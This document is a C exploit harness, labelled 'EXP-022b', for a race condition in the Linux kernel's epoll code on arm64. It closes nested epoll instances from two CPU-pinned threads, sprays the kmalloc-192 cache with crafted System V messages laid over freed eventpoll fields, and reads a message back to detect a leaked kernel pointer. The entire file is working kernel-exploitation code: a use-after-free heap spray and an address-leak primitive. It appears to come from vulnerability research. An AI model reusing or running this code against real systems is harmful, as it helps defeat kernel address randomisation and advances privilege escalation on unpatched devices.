#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <sched.h>
#include <unistd.h>
#include <sys/epoll.h>
#include <pthread.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/msg.h>
#include <sys/ipc.h>
#include <string.h>
#include <errno.h>
#include <stdint.h>
#include <sys/syscall.h>

int ep_outer1, ep_outer2, ep_inner;
int pipefd[2];
int msgq_id;

struct msg_struct {
    long mtype;
    char mtext[144]; // 144 bytes user data -> kmalloc-192
};

volatile int state = 0;

void craft_spray_msg(struct msg_struct *msg) {
    memset(msg->mtext, 0x00, sizeof(msg->mtext));
    // msg_msg user data starts at slab offset 48
    // To write to slab offset X, write to user data byte (X - 48)
    
    // Slab offset 96 (ep->lock) = user data byte 48-51
    *(uint32_t*)(msg->mtext + 48) = 0x00000000; // unlocked spinlock
    
    // Slab offset 104 (ep->rbr.rb_root.rb_node) = user data byte 56-63
    *(uint64_t*)(msg->mtext + 56) = 0x0000000000000000; // NULL
    
    // Slab offset 112 (ep->rbr.rb_leftmost) = user data byte 64-71
    *(uint64_t*)(msg->mtext + 64) = 0x0000000000000000; // NULL
    
    // Slab offset 136 (ep->user) = user data byte 88-95 -> doesn't matter for Thread A (uses OUTER ep)
    *(uint64_t*)(msg->mtext + 88) = 0xDEAD000000000000;
    
    // Slab offset 160 (refs.first) = user data byte 112-119 -> marker (will be OVERWRITTEN by hlist_del_rcu with epitem2 addr)
    *(uint64_t*)(msg->mtext + 112) = 0xDEAD000000000000;
    
    // All other bytes remain 0x00
}

void print_hex(const char *label, const void *data, size_t len) {
    const uint8_t *p = (const uint8_t*)data;
    printf("%s:\n", label);
    for (size_t i = 0; i < len; i += 16) {
        printf("  %04zx: ", i);
        for (size_t j = 0; j < 16 && i + j < len; j++) {
            printf("%02x ", p[i + j]);
        }
        printf("\n");
    }
}

void *thread_a(void *arg) {
    // Pin to CPU 0
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(0, &cpuset);
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);

    state = 1;
    close(ep_outer1);  // Close FIRST outer epoll
    return NULL;
}

void *thread_b(void *arg) {
    // Pin to CPU 1
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(1, &cpuset);
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);

    while (state == 0) {
        // Spin
    }
    // Thread A has started closing. Wait for it to hit Breakpoint 1.
    usleep(100000); // 100ms
    close(ep_inner); // This will trigger ep_free of inner_epoll
    
    // SPRAY immediately on the same thread (same CPU)
    struct msg_struct msg;
    msg.mtype = 0x1337;
    craft_spray_msg(&msg);
    
    printf("[*] Thread B starting msgsnd loop...\n");
    int sent = 0;
    for (int i = 0; i < 5000; i++) {
        int ret = msgsnd(msgq_id, &msg, sizeof(msg.mtext), IPC_NOWAIT);
        if (ret < 0) {
            printf("[*] msgsnd failed at %d: errno=%d\n", i, errno);
            break;
        }
        sent++;
    }
    printf("[*] Spray complete. Sent %d messages.\n", sent);
    syscall(147, 1337, 1337, 1337); // SYS_setresuid on arm64 is 147
    return NULL;
}

int main() {
    printf("[*] Starting EXP-022b harness (Info Leak via hlist_del_rcu)...\n");
    printf("[*] DUAL-WATCH: inner_epoll added to TWO outer epolls\n");
    printf("[*] Target: hlist_del_rcu writes epitem2 address to offset 160 (msg byte 112)\n");
    
    msgq_id = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
    if (msgq_id == -1) {
        perror("msgget");
        return 1;
    }
    printf("[*] msgq_id = %d\n", msgq_id);

    pipe(pipefd);
    printf("[*] pipe: %d, %d\n", pipefd[0], pipefd[1]);

    state = 0;
    ep_outer1 = epoll_create1(0);
    ep_outer2 = epoll_create1(0);
    ep_inner = epoll_create1(0);
    printf("[*] ep_outer1 = %d, ep_outer2 = %d, ep_inner = %d\n", ep_outer1, ep_outer2, ep_inner);
    
    struct epoll_event ev;
    ev.events = EPOLLIN;
    
    // Add a pipe fd to inner epoll (so inner has at least one fd)
    ev.data.fd = pipefd[0];
    if (epoll_ctl(ep_inner, EPOLL_CTL_ADD, pipefd[0], &ev) < 0) {
        perror("epoll_ctl add pipe to inner");
        return 1;
    }
    printf("[*] Added pipe to inner epoll\n");
    
    // Add inner epoll to FIRST outer epoll
    ev.events = EPOLLIN;
    ev.data.fd = ep_inner;
    if (epoll_ctl(ep_outer1, EPOLL_CTL_ADD, ep_inner, &ev) < 0) {
        perror("epoll_ctl add inner to outer1");
        return 1;
    }
    printf("[*] Added inner epoll to outer1\n");
    
    // Add inner epoll to SECOND outer epoll -> creates 2nd epitem in inner_epoll->refs
    if (epoll_ctl(ep_outer2, EPOLL_CTL_ADD, ep_inner, &ev) < 0) {
        perror("epoll_ctl add inner to outer2");
        return 1;
    }
    printf("[*] Added inner epoll to outer2 (dual-watch)\n");
    
    pthread_t ta, tb;
    pthread_create(&ta, NULL, thread_a, NULL);
    pthread_create(&tb, NULL, thread_b, NULL);
    
    pthread_join(ta, NULL);
    printf("[*] Thread A (close outer1) joined\n");
    pthread_join(tb, NULL);
    printf("[*] Thread B (close inner + spray) joined\n");
    
    // Now read back the message to check for leak
    printf("[*] Calling msgrcv to read back sprayed message...\n");
    struct msg_struct recv_msg;
    ssize_t recv_len = msgrcv(msgq_id, &recv_msg, sizeof(recv_msg.mtext), 0x1337, IPC_NOWAIT);
    if (recv_len < 0) {
        perror("msgrcv failed");
        return 1;
    }
    printf("[*] msgrcv received %zd bytes\n", recv_len);
    
    // Print sent vs received for comparison
    struct msg_struct sent_msg;
    sent_msg.mtype = 0x1337;
    craft_spray_msg(&sent_msg);
    
    print_hex("SENT message (user data)", sent_msg.mtext, 144);
    print_hex("RECEIVED message (user data)", recv_msg.mtext, 144);
    
    // Check for differences - focus on offset 112 (slab 160)
    printf("\n[*] DIFFERENCE ANALYSIS:\n");
    for (int i = 0; i < 144; i += 8) {
        uint64_t sent = *(uint64_t*)(sent_msg.mtext + i);
        uint64_t recv = *(uint64_t*)(recv_msg.mtext + i);
        if (sent != recv) {
            printf("  Byte %3d-%3d (slab offset %3d): sent=0x%016lx recv=0x%016lx",
                   i, i+7, i+48, sent, recv);
            // Check if it looks like a kernel pointer
            if ((recv & 0xffff000000000000UL) == 0xffff000000000000UL) {
                printf("  *** KERNEL POINTER LEAKED! ***");
            }
            printf("\n");
        }
    }
    
    printf("[*] Done.\n");
    return 0;
}